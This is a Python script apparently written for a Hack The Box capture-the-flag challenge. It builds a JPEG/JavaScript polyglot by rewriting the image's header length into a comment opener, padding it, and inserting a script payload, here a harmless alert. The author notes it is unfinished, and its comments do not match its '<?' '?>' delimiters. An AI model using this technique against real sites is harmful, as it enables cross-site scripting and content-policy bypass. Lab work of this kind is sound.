import binascii
# eric turner - 23 Sep 2021 - HTB TwoDots Horror - Stenography
# see https://github.com/corkami/formats/blob/master/image/jpeg.md for dissection of hex
# pythonified version of https://medium.com/@codedbrain/hiding-js-in-a-jpeg-header-454386f9e20

# Note from 3 Mar 2022: My notes show I never finished this challenge. This is what I had saved, as to what I was trying to do!

# variables
# use <? ?> for HTML
# use /* */ for JS
infile = 'test.jpeg'
open_comment = b'<?'
close_comment = b'?>'
payload = b'<script>alert("Hello");</script>'
outfile = 'newimg.jpg'

#https://stackoverflow.com/questions/12032414/python-3-string-to-hex-hex-to-format
#makes b'ffd8ffe0' look like FF D8 FF E0 for pretty printing
def format_hex(string):
    hex = str(string, 'ascii')
    return ' '.join(hex[i:i+2] for i in range(0, len(hex), 2)).upper()

with open(infile, 'rb') as f:
    print('IMG Opened: {}'.format(f.name))
    data = f.read()
    # read bytes as hex
    hex_data = binascii.hexlify(data)
    # FF D8 FF E0 is the signature that makes this a valid JPEG
    # FF D8 starts the image
    # FF E0 tells us the next two bytes are the length of the JPEG header
    start_of_block = hex_data.find(b'ffe0')
    sig = hex_data[0:start_of_block + 4]
    print ('IMG Header: {}'.format(format_hex(sig)))
    print ('IMG Total Bytes: {}'.format(len(hex_data)))
    # grab the length of the header, 00 10, in our case
    og_leng_hex = hex_data[start_of_block + 4 : start_of_block + 8]
    # convert to decimal: 16 in our case
    og_len_dec = int(og_leng_hex, 16)
    print ('\nIMG Original Header Length: {} ({} bytes)'.format(format_hex(og_leng_hex), og_len_dec))
    # Replace the JPEG header length bytes to 2F 2A, which is a /* JS comment
    header_len_comment = binascii.hexlify(open_comment)
    # we will have to use this new length to calculate the padding
    # /* (2F 2A) translates to 12074
    new_hd_len = int(header_len_comment, 16)
    print ('New IMG Header Length: {} ({} bytes)'.format(format_hex(header_len_comment), new_hd_len))
    # calculate the size of the header. 
    # the FF D8 FF E0 2F 2A = 12
    end_of_block =  hex_data.find(b'ff', 12) 
    print('End of FF E0 Block: {}'.format(end_of_block))
    # image may not have a comment so if we cannot find FF EE in the beginning then use the quantisation table
    og_header = hex_data[12:end_of_block]
    # create the new header with new length bytes
    new_header = sig + header_len_comment + og_header
    #print('New Header: {}'.format(format_hex(new_header)))

    # now we need our payload, wrap in quotes to close the comments we made before
    payload_str = close_comment + payload + open_comment
    payload_hex = binascii.hexlify(payload_str)
    payload_len = len(payload_str)
    print('\nIMG Header JS Payload: {}'.format(str(payload_str,'ascii')))
    print('IMG Header Payload Hex: {}'.format(format_hex(payload_hex)))
    print('IMG Header Payload Len: {}'.format(payload_len))
    
    # because our new length of 2F 2A is 12074, we need to pad the remaining characters 
    # with null byte (00) to complete the header
    # note I used og_len_dec and not og_hd_len to remove any possible comments FF FE
    padding = b'00'*(new_hd_len - og_len_dec - payload_len) 
    p_len = len(padding)
    print('\nPayload Padding: {}'.format(p_len / 2))

    # combine it all into our new image
    new_img = new_header + padding + payload_hex + hex_data[end_of_block:len(hex_data)]
    # we need to close the comment (2A 2F) before the end, FF D9
    print('Replacing ending FF D9 with 2A 2F FF D9 to close JS comment')
    new_img_len = new_img.find(b'ffd9')
    img = new_img[0:new_img_len]
    img += binascii.hexlify(close_comment) + b'ffd9'
    # convert hex back to binary
    binary = binascii.unhexlify(img)
    # write the binary to a new file
    with open(outfile, 'wb') as nf:
        print('Writing Binary to ./{}'.format(outfile))
        nf.write(binary)
